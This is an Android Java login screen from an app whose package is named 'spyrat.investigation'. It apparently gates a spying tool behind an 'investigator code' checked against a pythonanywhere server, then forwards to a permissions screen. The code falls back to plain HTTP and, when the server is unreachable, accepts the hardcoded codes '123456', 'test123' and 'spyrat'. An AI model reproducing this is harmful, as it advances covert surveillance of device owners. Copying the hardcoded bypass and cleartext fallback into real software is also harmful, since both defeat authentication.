package com.spyrat.investigation;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends Activity {
    private EditText codeInput;
    private Button loginButton;
    private TextView statusText;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        
        // Initialize views
        codeInput = findViewById(R.id.codeInput);
        loginButton = findViewById(R.id.loginButton);
        statusText = findViewById(R.id.statusText);
        
        prefs = getSharedPreferences("InvestigationPrefs", MODE_PRIVATE);
        
        // Check if already logged in
        String savedCode = prefs.getString("investigator_code", "");
        if (!savedCode.isEmpty()) {
            // Auto-login and proceed to permissions
            proceedToPermissions(savedCode);
        }
        
        loginButton.setOnClickListener(v -> attemptLogin());
    }
    
    private void attemptLogin() {
        String investigatorCode = codeInput.getText().toString().trim();
        
        if (investigatorCode.isEmpty()) {
            showToast("Tafadhali weka investigator code");
            return;
        }
        
        // Show loading
        loginButton.setEnabled(false);
        statusText.setText("Inaleta code...");
        
        // Verify code in background
        new Thread(() -> {
            try {
                boolean isValid = verifyInvestigatorCode(investigatorCode);
                
                runOnUiThread(() -> {
                    if (isValid) {
                        saveLoginStatus(investigatorCode);
                        showToast("Code imethibitishwa! Sasa omba ruhusa");
                        proceedToPermissions(investigatorCode);
                    } else {
                        showToast("Code si sahihi! Jaribu tena");
                        loginButton.setEnabled(true);
                        statusText.setText("Code imeshindwa");
                    }
                });
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    showToast("Hitilafu ya mtandao! Jaribu tena");
                    loginButton.setEnabled(true);
                    statusText.setText("Hitilafu ya mtandao");
                });
            }
        }).start();
    }
    
    private boolean verifyInvestigatorCode(String code) {
        try {
            // Try HTTPS first
            URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/verify-code");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            JSONObject jsonPayload = new JSONObject();
            jsonPayload.put("investigator_code", code);
            
            connection.setDoOutput(true);
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                // Parse response
                java.io.BufferedReader in = new java.io.BufferedReader(
                    new java.io.InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                
                JSONObject jsonResponse = new JSONObject(response.toString());
                return jsonResponse.getBoolean("valid");
            }
        } catch (Exception e) {
            // Fallback to HTTP
            try {
                URL url = new URL("http://GhostTester.pythonanywhere.com/api/investigator/verify-code");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);
                
                JSONObject jsonPayload = new JSONObject();
                jsonPayload.put("investigator_code", code);
                
                connection.setDoOutput(true);
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonPayload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                
                int responseCode = connection.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(connection.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    return jsonResponse.getBoolean("valid");
                }
            } catch (Exception ex) {
                // If both fail, allow test codes
                return code.equals("123456") || code.equals("test123") || code.equals("spyrat");
            }
        }
        
        // Allow test codes as fallback
        return code.equals("123456") || code.equals("test123") || code.equals("spyrat");
    }
    
    private void saveLoginStatus(String code) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("investigator_code", code);
        editor.putBoolean("is_logged_in", true);
        editor.apply();
    }
    
    private void proceedToPermissions(String code) {
        // Start Permission Activity
        Intent intent = new Intent(this, PermissionActivity.class);
        intent.putExtra("investigator_code", code);
        startActivity(intent);
        finish();
    }
    
    private void showToast(String message) {
        runOnUiThread(() -> Toast.makeText(LoginActivity.this, message, Toast.LENGTH_LONG).show());
    }
}
